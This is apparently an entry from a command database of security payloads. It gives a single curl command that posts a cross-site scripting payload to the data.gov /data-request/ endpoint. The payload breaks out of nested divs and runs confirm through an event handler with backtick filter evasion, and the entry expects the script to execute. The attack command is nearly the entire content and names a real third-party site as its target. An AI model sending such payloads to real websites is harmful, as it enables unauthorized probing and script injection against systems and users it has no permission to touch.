---
id: cmd-uuid-5
data: >-
  curl -X POST 'https://www.data.gov/data-request/' -d
  'agency_name=48027\"%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3Cbrute
  onbeforescriptexecute=confirm`1`>'
tags:
  - xss
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:38.796Z'
verified: false
validated: true
submitted: true
---
# curl-xss-data-request

## Command

```bash
curl -X POST 'https://www.data.gov/data-request/' -d 'agency_name=48027\"%3E%3C/div%3E%3C/div%3E%3C/div%3E%3C/div%3E%3Cbrute onbeforescriptexecute=confirm`1`>'
```

## Description

Injects XSS into agency_name with backtick evasion for /data-request/.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d` | Payload with backticks | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'target' -d 'agency_name=payload'
```

## Expected Output

Reflected; JS executes confirm(1).

## Related

- [[procedures/Test-Similar-Vulnerability-on-data-request-Endpoint]]
